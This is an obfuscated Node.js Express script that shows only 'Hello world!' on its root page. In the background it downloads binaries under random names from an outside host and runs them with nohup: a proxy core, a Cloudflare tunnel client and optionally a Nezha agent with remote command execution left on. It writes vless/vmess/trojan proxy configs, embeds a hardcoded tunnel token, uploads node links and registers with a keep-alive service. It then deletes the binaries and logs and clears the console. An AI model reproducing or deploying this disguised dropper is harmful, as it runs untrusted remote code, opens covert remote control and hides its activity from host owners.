const _0x4ea5=['NAME','ARGO_DOMAIN','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Subscription\x20uploaded\x20successfully','Content-Type','&path=%2Fvless-argo%3Fed%3D2560#','then','\x0a\x20\x20tunnel:\x20','pop','status','\x20is\x20created','has','win32','basename','data','pkill\x20-f\x20\x22[','nohup\x20','\x20>/dev/null\x202>&1','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','eyJhIjoiNTdkM2UxNWQwNzFlYmY0ODNlZmY2NGYzNjExOTEyOGQiLCJ0IjoiY2FkN2RlOTctMDUyZi00ODczLTkxMzQtYmFjNjY4MjIzZjE1IiwicyI6Ik5XSmpNR0ppWTJFdE1tUXpOQzAwWlRNMExUZ3dZemN0TmpRNFltTmhPVFl4TW1SaSJ9','abcdefghijklmnopqrstuvwxyz','exec','send','SUB_PATH','path','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','boot.log','\x0a\x20\x20\x20\x20','2087','App\x20is\x20running','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','get','forEach','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x20>\x20nul\x202>&1','stringify','match','org','443','/trojan-argo','arm64','country_code','https+local://8.8.8.8/dns-query','application/json','test','Hello\x20world!','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','catch','CFPORT','https://arm64.ssss.nyc.mn/agent','win369','http','none','Error\x20in\x20startserver:','NEZHA_SERVER','join','\x20successfully','tls','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Download\x20','statSync','2096','rm\x20-rf\x20','\x22\x20>\x20/dev/null\x202>&1','success','env','split','error','2053','/vmess-argo','filter','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','xtls-rprx-vision','blackhole','countryCode','Skipping\x20adding\x20automatic\x20access\x20task','https://amd64.ssss.nyc.mn/web','\x0a\x20\x20credentials-file:\x20','tcp','direct','arch','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','127.0.0.1','utf-8','quic','ARGO_PORT','SERVER_PORT','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','galaxy777.sunnyluck.ggff.net','express','toString','from','https://arm64.ssss.nyc.mn/web','/api/delete-nodes','log','./tmp','post','config.yaml','config.json','PORT','unlinkSync','.exe\x20>\x20nul\x202>&1','existsSync','tunnel.json','https://amd64.ssss.nyc.mn/v1','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','true','\x20-c\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','length','tunnel.yml','vmess','taskkill\x20/f\x20/im\x20','base64','TunnelSecret','Error\x20reading\x20boot.log:','Unhandled\x20error\x20in\x20startserver:','npm\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/agent','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20is\x20running','vless','arm','isFile','https://arm64.ssss.nyc.mn/bot','writeFileSync','trojan','map','/vless-argo','substring','includes','floor','mkdirSync','unlink'];const _0x2448=function(_0x4ea5e9,_0x244863){_0x4ea5e9=_0x4ea5e9-0x0;let _0x534bdf=_0x4ea5[_0x4ea5e9];return _0x534bdf;};const express=require(_0x2448('0x5c'));const app=express();const axios=require('axios');const os=require('os');const fs=require('fs');const path=require(_0x2448('0x19'));const {promisify}=require('util');const exec=promisify(require('child_process')[_0x2448('0x16')]);const {execSync}=require('child_process');const UPLOAD_URL=process[_0x2448('0x44')]['UPLOAD_URL']||'';const PROJECT_URL=process['env']['PROJECT_URL']||'';const AUTO_ACCESS=process[_0x2448('0x44')]['AUTO_ACCESS']||![];const FILE_PATH=process['env']['FILE_PATH']||_0x2448('0x62');const SUB_PATH=process['env'][_0x2448('0x18')]||_0x2448('0x35');const PORT=process[_0x2448('0x44')][_0x2448('0x59')]||process['env'][_0x2448('0x66')]||0xbb8;const UUID=process[_0x2448('0x44')]['UUID']||'f4be6554-e52b-4541-8f58-8aa3107f72fe';const NEZHA_SERVER=process[_0x2448('0x44')][_0x2448('0x39')]||'';const NEZHA_PORT=process[_0x2448('0x44')]['NEZHA_PORT']||'';const NEZHA_KEY=process['env']['NEZHA_KEY']||'';const ARGO_DOMAIN=process[_0x2448('0x44')][_0x2448('0x1')]||_0x2448('0x5b');const ARGO_AUTH=process[_0x2448('0x44')]['ARGO_AUTH']||_0x2448('0x14');const ARGO_PORT=process[_0x2448('0x44')][_0x2448('0x58')]||0x1f41;const CFIP=process['env']['CFIP']||'cdns.doon.eu.org';const CFPORT=process['env'][_0x2448('0x33')]||0x1bb;const NAME=process['env'][_0x2448('0x0')]||'sunny';if(!fs['existsSync'](FILE_PATH)){fs[_0x2448('0x87')](FILE_PATH);console[_0x2448('0x61')](FILE_PATH+_0x2448('0xb'));}else{console[_0x2448('0x61')](FILE_PATH+'\x20already\x20exists');}function generateRandomName(){const _0x5946c9=_0x2448('0x15');let _0x39ea22='';for(let _0x822781=0x0;_0x822781<0x6;_0x822781++){_0x39ea22+=_0x5946c9['charAt'](Math[_0x2448('0x86')](Math['random']()*_0x5946c9['length']));}return _0x39ea22;}const npmName=generateRandomName();const webName=generateRandomName();const botName=generateRandomName();const phpName=generateRandomName();let npmPath=path[_0x2448('0x3a')](FILE_PATH,npmName);let phpPath=path['join'](FILE_PATH,phpName);let webPath=path[_0x2448('0x3a')](FILE_PATH,webName);let botPath=path['join'](FILE_PATH,botName);let subPath=path['join'](FILE_PATH,'sub.txt');let listPath=path['join'](FILE_PATH,'list.txt');let bootLogPath=path[_0x2448('0x3a')](FILE_PATH,_0x2448('0x1b'));let configPath=path[_0x2448('0x3a')](FILE_PATH,_0x2448('0x65'));function deleteNodes(){try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x33f873;try{_0x33f873=fs['readFileSync'](subPath,_0x2448('0x56'));}catch{return null;}const _0x25baaa=Buffer[_0x2448('0x5e')](_0x33f873,'base64')[_0x2448('0x5d')](_0x2448('0x56'));const _0x339ed4=_0x25baaa[_0x2448('0x45')]('\x0a')['filter'](_0x3d5968=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3d5968));if(_0x339ed4[_0x2448('0x70')]===0x0)return;axios[_0x2448('0x63')](UPLOAD_URL+_0x2448('0x60'),JSON[_0x2448('0x26')]({'nodes':_0x339ed4}),{'headers':{'Content-Type':_0x2448('0x2e')}})['catch'](_0x34f3de=>{return null;});return null;}catch(_0x5b0b5c){return null;}}function cleanupOldFiles(){try{const _0x8637e1=fs['readdirSync'](FILE_PATH);_0x8637e1['forEach'](_0x2a0b7c=>{const _0x3c70aa=path['join'](FILE_PATH,_0x2a0b7c);try{const _0x3895a2=fs[_0x2448('0x3f')](_0x3c70aa);if(_0x3895a2[_0x2448('0x7e')]()){fs[_0x2448('0x67')](_0x3c70aa);}}catch(_0x508784){}});}catch(_0x2f7993){}}app['get']('/',function(_0x2ce686,_0x1aea78){_0x1aea78[_0x2448('0x17')](_0x2448('0x30'));});async function generateConfig(){const _0x200394={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x2448('0x37')},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x2448('0x4b')}],'decryption':_0x2448('0x37'),'fallbacks':[{'dest':0xbb9},{'path':_0x2448('0x83'),'dest':0xbba},{'path':_0x2448('0x48'),'dest':0xbbb},{'path':_0x2448('0x2a'),'dest':0xbbc}]},'streamSettings':{'network':_0x2448('0x51')}},{'port':0xbb9,'listen':_0x2448('0x55'),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':_0x2448('0x55'),'protocol':_0x2448('0x7c'),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2448('0x37')},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2448('0x36'),'tls',_0x2448('0x57')],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x2448('0x72'),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2448('0x48')}},'sniffing':{'enabled':!![],'destOverride':[_0x2448('0x36'),_0x2448('0x3c'),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x2448('0x81'),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2448('0x37'),'wsSettings':{'path':_0x2448('0x2a')}},'sniffing':{'enabled':!![],'destOverride':[_0x2448('0x36'),_0x2448('0x3c'),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x2448('0x2d')]},'outbounds':[{'protocol':'freedom','tag':_0x2448('0x52')},{'protocol':_0x2448('0x4c'),'tag':'block'}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x2448('0x65')),JSON['stringify'](_0x200394,null,0x2));}function getSystemArchitecture(){const _0x381dad=os[_0x2448('0x53')]();if(_0x381dad==='arm'||_0x381dad===_0x2448('0x2b')||_0x381dad==='aarch64'){return _0x2448('0x7d');}else{return'amd';}}function downloadFile(_0x4bcb47,_0x356274,_0x15aa8f){const _0x59de69=_0x4bcb47;if(!fs['existsSync'](FILE_PATH)){fs[_0x2448('0x87')](FILE_PATH,{'recursive':!![]});}const _0x47a54f=fs['createWriteStream'](_0x59de69);axios({'method':_0x2448('0x21'),'url':_0x356274,'responseType':'stream'})[_0x2448('0x7')](_0x5a692a=>{_0x5a692a['data']['pipe'](_0x47a54f);_0x47a54f['on']('finish',()=>{_0x47a54f['close']();console[_0x2448('0x61')](_0x2448('0x3e')+path['basename'](_0x59de69)+_0x2448('0x3b'));_0x15aa8f(null,_0x59de69);});_0x47a54f['on']('error',_0x2bcf3f=>{fs[_0x2448('0x88')](_0x59de69,()=>{});const _0x241713='Download\x20'+path['basename'](_0x59de69)+'\x20failed:\x20'+_0x2bcf3f['message'];console[_0x2448('0x46')](_0x241713);_0x15aa8f(_0x241713);});})[_0x2448('0x32')](_0x47d75a=>{const _0x49290d='Download\x20'+path[_0x2448('0xe')](_0x59de69)+'\x20failed:\x20'+_0x47d75a['message'];console[_0x2448('0x46')](_0x49290d);_0x15aa8f(_0x49290d);});}async function downloadFilesAndRun(){const _0x4651e5=getSystemArchitecture();const _0x1013fe=getFilesForArchitecture(_0x4651e5);if(_0x1013fe[_0x2448('0x70')]===0x0){console[_0x2448('0x61')]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x123038=_0x1013fe[_0x2448('0x82')](_0x14363a=>{return new Promise((_0x571cd1,_0x4c040f)=>{downloadFile(_0x14363a['fileName'],_0x14363a['fileUrl'],(_0x572592,_0x5aaa0a)=>{if(_0x572592){_0x4c040f(_0x572592);}else{_0x571cd1(_0x5aaa0a);}});});});try{await Promise['all'](_0x123038);}catch(_0x405292){console['error']('Error\x20downloading\x20files:',_0x405292);return;}function _0x54c93b(_0x421854){const _0x3ac5eb=0x1fd;_0x421854['forEach'](_0x1bb17c=>{if(fs[_0x2448('0x69')](_0x1bb17c)){fs['chmod'](_0x1bb17c,_0x3ac5eb,_0x11b07d=>{if(_0x11b07d){console['error']('Empowerment\x20failed\x20for\x20'+_0x1bb17c+':\x20'+_0x11b07d);}else{console[_0x2448('0x61')]('Empowerment\x20success\x20for\x20'+_0x1bb17c+':\x20'+_0x3ac5eb[_0x2448('0x5d')](0x8));}});}});}const _0x9c6d7c=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x54c93b(_0x9c6d7c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1de4b9=NEZHA_SERVER[_0x2448('0x85')](':')?NEZHA_SERVER['split'](':')[_0x2448('0x9')]():'';const _0xd81c19=new Set([_0x2448('0x29'),'8443','2096',_0x2448('0x1d'),'2083','2053']);const _0x43525e=_0xd81c19[_0x2448('0xc')](_0x1de4b9)?_0x2448('0x6d'):'false';const _0x37e117='\x0aclient_secret:\x20'+NEZHA_KEY+_0x2448('0x54')+NEZHA_SERVER+_0x2448('0x24')+_0x43525e+_0x2448('0x23')+UUID;fs['writeFileSync'](path[_0x2448('0x3a')](FILE_PATH,_0x2448('0x64')),_0x37e117);const _0xf91657='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x2448('0x6c');try{await exec(_0xf91657);console['log'](phpName+'\x20is\x20running');await new Promise(_0x2d8932=>setTimeout(_0x2d8932,0x3e8));}catch(_0x49710){console[_0x2448('0x46')]('php\x20running\x20error:\x20'+_0x49710);}}else{let _0x174c48='';const _0x15ebfc=['443','8443',_0x2448('0x40'),_0x2448('0x1d'),'2083',_0x2448('0x47')];if(_0x15ebfc['includes'](NEZHA_PORT)){_0x174c48='--tls';}const _0x1e5f07='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x174c48+_0x2448('0x1f');try{await exec(_0x1e5f07);console['log'](npmName+_0x2448('0x7b'));await new Promise(_0x63b32f=>setTimeout(_0x63b32f,0x3e8));}catch(_0x2b7dc9){console['error'](_0x2448('0x78')+_0x2b7dc9);}}}else{console[_0x2448('0x61')](_0x2448('0x6f'));}const _0x6707e8=_0x2448('0x11')+webPath+_0x2448('0x6e')+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x6707e8);console[_0x2448('0x61')](webName+'\x20is\x20running');await new Promise(_0x3a5cc9=>setTimeout(_0x3a5cc9,0x3e8));}catch(_0x361baa){console['error']('web\x20running\x20error:\x20'+_0x361baa);}if(fs[_0x2448('0x69')](botPath)){let _0x548b1a;if(ARGO_AUTH[_0x2448('0x27')](/^[A-Z0-9a-z=]{120,250}$/)){_0x548b1a=_0x2448('0x4a')+ARGO_AUTH;}else if(ARGO_AUTH[_0x2448('0x27')](/TunnelSecret/)){_0x548b1a=_0x2448('0x7a')+FILE_PATH+'/tunnel.yml\x20run';}else{_0x548b1a='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2448('0x20')+ARGO_PORT;}try{await exec('nohup\x20'+botPath+'\x20'+_0x548b1a+'\x20>/dev/null\x202>&1\x20&');console[_0x2448('0x61')](botName+_0x2448('0x7b'));await new Promise(_0x431b5c=>setTimeout(_0x431b5c,0x7d0));}catch(_0x13d89e){console['error']('Error\x20executing\x20command:\x20'+_0x13d89e);}}await new Promise(_0x21c121=>setTimeout(_0x21c121,0x1388));}function getFilesForArchitecture(_0x236c74){let _0x4c9bf2;if(_0x236c74==='arm'){_0x4c9bf2=[{'fileName':webPath,'fileUrl':_0x2448('0x5f')},{'fileName':botPath,'fileUrl':_0x2448('0x7f')}];}else{_0x4c9bf2=[{'fileName':webPath,'fileUrl':_0x2448('0x4f')},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];}if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xd6beb1=_0x236c74===_0x2448('0x7d')?_0x2448('0x34'):_0x2448('0x79');_0x4c9bf2['unshift']({'fileName':npmPath,'fileUrl':_0xd6beb1});}else{const _0x354ded=_0x236c74===_0x2448('0x7d')?'https://arm64.ssss.nyc.mn/v1':_0x2448('0x6b');_0x4c9bf2['unshift']({'fileName':phpPath,'fileUrl':_0x354ded});}}return _0x4c9bf2;}function argoType(){if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2448('0x61')](_0x2448('0x3'));return;}if(ARGO_AUTH[_0x2448('0x85')](_0x2448('0x75'))){fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x55a9db=_0x2448('0x8')+ARGO_AUTH['split']('\x22')[0xb]+_0x2448('0x50')+path['join'](FILE_PATH,_0x2448('0x6a'))+_0x2448('0x1a')+ARGO_DOMAIN+_0x2448('0x3d')+ARGO_PORT+_0x2448('0x2');fs[_0x2448('0x80')](path[_0x2448('0x3a')](FILE_PATH,_0x2448('0x71')),_0x55a9db);}else{console[_0x2448('0x61')]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}}async function extractDomains(){let _0x403165;if(ARGO_AUTH&&ARGO_DOMAIN){_0x403165=ARGO_DOMAIN;console['log']('ARGO_DOMAIN:',_0x403165);await _0x10e125(_0x403165);}else{try{const _0x1df86b=fs['readFileSync'](path[_0x2448('0x3a')](FILE_PATH,'boot.log'),'utf-8');const _0x407854=_0x1df86b[_0x2448('0x45')]('\x0a');const _0x2be305=[];_0x407854[_0x2448('0x22')](_0xeb3e36=>{const _0x303808=_0xeb3e36['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x303808){const _0x41e791=_0x303808[0x1];_0x2be305['push'](_0x41e791);}});if(_0x2be305['length']>0x0){_0x403165=_0x2be305[0x0];console[_0x2448('0x61')]('ArgoDomain:',_0x403165);await _0x10e125(_0x403165);}else{console[_0x2448('0x61')](_0x2448('0x13'));fs[_0x2448('0x67')](path[_0x2448('0x3a')](FILE_PATH,'boot.log'));async function _0x1792f7(){try{if(process['platform']===_0x2448('0xd')){await exec(_0x2448('0x73')+botName+_0x2448('0x68'));}else{await exec(_0x2448('0x10')+botName['charAt'](0x0)+']'+botName[_0x2448('0x84')](0x1)+_0x2448('0x42'));}}catch(_0x5c04c7){}}_0x1792f7();await new Promise(_0x4aa942=>setTimeout(_0x4aa942,0xbb8));const _0x3f0700=_0x2448('0x31')+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x3f0700+'\x20>/dev/null\x202>&1\x20&');console['log'](botName+_0x2448('0x7b'));await new Promise(_0x3af0dc=>setTimeout(_0x3af0dc,0xbb8));await extractDomains();}catch(_0x597595){console['error']('Error\x20executing\x20command:\x20'+_0x597595);}}}catch(_0x1155cc){console['error'](_0x2448('0x76'),_0x1155cc);}}async function _0x2ec684(){try{const _0x2b5b78=await axios['get']('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x2b5b78[_0x2448('0xf')]&&_0x2b5b78[_0x2448('0xf')][_0x2448('0x2c')]&&_0x2b5b78['data']['org']){return _0x2b5b78[_0x2448('0xf')]['country_code']+'_'+_0x2b5b78['data']['org'];}}catch(_0x9276a0){try{const _0x484c70=await axios[_0x2448('0x21')]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x484c70[_0x2448('0xf')]&&_0x484c70[_0x2448('0xf')]['status']===_0x2448('0x43')&&_0x484c70[_0x2448('0xf')][_0x2448('0x4d')]&&_0x484c70[_0x2448('0xf')][_0x2448('0x28')]){return _0x484c70['data'][_0x2448('0x4d')]+'_'+_0x484c70['data']['org'];}}catch(_0x540879){}}return'Unknown';}async function _0x10e125(_0x22dd95){const _0x171476=await _0x2ec684();const _0x424912=NAME?NAME+'-'+_0x171476:_0x171476;return new Promise(_0x613647=>{setTimeout(()=>{const _0x2c938c={'v':'2','ps':''+_0x424912,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x2448('0x37'),'host':_0x22dd95,'path':'/vmess-argo?ed=2560','tls':_0x2448('0x3c'),'sni':_0x22dd95,'alpn':'','fp':'firefox'};const _0x542c8e='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x22dd95+'&fp=firefox&type=ws&host='+_0x22dd95+_0x2448('0x6')+_0x424912+'\x0a\x0avmess://'+Buffer['from'](JSON[_0x2448('0x26')](_0x2c938c))['toString'](_0x2448('0x74'))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x22dd95+'&fp=firefox&type=ws&host='+_0x22dd95+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x424912+_0x2448('0x1c');console[_0x2448('0x61')](Buffer[_0x2448('0x5e')](_0x542c8e)[_0x2448('0x5d')](_0x2448('0x74')));fs['writeFileSync'](subPath,Buffer['from'](_0x542c8e)['toString']('base64'));console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully');uploadNodes();app['get']('/'+SUB_PATH,(_0x5843f7,_0x2193fa)=>{const _0x532794=Buffer['from'](_0x542c8e)[_0x2448('0x5d')](_0x2448('0x74'));_0x2193fa['set'](_0x2448('0x5'),'text/plain;\x20charset=utf-8');_0x2193fa['send'](_0x532794);});_0x613647(_0x542c8e);},0x7d0);});}}async function uploadNodes(){if(UPLOAD_URL&&PROJECT_URL){const _0x25c799=PROJECT_URL+'/'+SUB_PATH;const _0x25d2b9={'subscription':[_0x25c799]};try{const _0x1887d0=await axios[_0x2448('0x63')](UPLOAD_URL+'/api/add-subscriptions',_0x25d2b9,{'headers':{'Content-Type':_0x2448('0x2e')}});if(_0x1887d0&&_0x1887d0[_0x2448('0xa')]===0xc8){console[_0x2448('0x61')](_0x2448('0x4'));return _0x1887d0;}else{return null;}}catch(_0x2c49ad){if(_0x2c49ad['response']){if(_0x2c49ad['response']['status']===0x190){}}}}else if(UPLOAD_URL){if(!fs[_0x2448('0x69')](listPath))return;const _0x4c74e1=fs['readFileSync'](listPath,'utf-8');const _0x4d39f5=_0x4c74e1['split']('\x0a')[_0x2448('0x49')](_0x4c5bb3=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2448('0x2f')](_0x4c5bb3));if(_0x4d39f5['length']===0x0)return;const _0x193d41=JSON[_0x2448('0x26')]({'nodes':_0x4d39f5});try{const _0x570902=await axios[_0x2448('0x63')](UPLOAD_URL+'/api/add-nodes',_0x193d41,{'headers':{'Content-Type':'application/json'}});if(_0x570902&&_0x570902[_0x2448('0xa')]===0xc8){console[_0x2448('0x61')]('Nodes\x20uploaded\x20successfully');return _0x570902;}else{return null;}}catch(_0x467cba){return null;}}else{return;}}function cleanFiles(){setTimeout(()=>{const _0x3c85dd=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT){_0x3c85dd['push'](npmPath);}else if(NEZHA_SERVER&&NEZHA_KEY){_0x3c85dd['push'](phpPath);}if(process['platform']==='win32'){exec('del\x20/f\x20/q\x20'+_0x3c85dd[_0x2448('0x3a')]('\x20')+_0x2448('0x25'),_0x21e2ad=>{console['clear']();console[_0x2448('0x61')](_0x2448('0x1e'));console['log'](_0x2448('0x5a'));});}else{exec(_0x2448('0x41')+_0x3c85dd['join']('\x20')+_0x2448('0x12'),_0x30253c=>{console['clear']();console['log'](_0x2448('0x1e'));console[_0x2448('0x61')]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});}},0x15f90);}cleanFiles();async function AddVisitTask(){if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x2448('0x4e'));return;}try{const _0x1800ba=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2448('0x2e')}});console['log']('automatic\x20access\x20task\x20added\x20successfully');return _0x1800ba;}catch(_0x50d9ed){console[_0x2448('0x46')]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x50d9ed['message']);return null;}}async function startserver(){try{argoType();deleteNodes();cleanupOldFiles();await generateConfig();await downloadFilesAndRun();await extractDomains();await AddVisitTask();}catch(_0x2a0737){console[_0x2448('0x46')](_0x2448('0x38'),_0x2a0737);}}startserver()[_0x2448('0x32')](_0x404751=>{console[_0x2448('0x46')](_0x2448('0x77'),_0x404751);});app['listen'](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
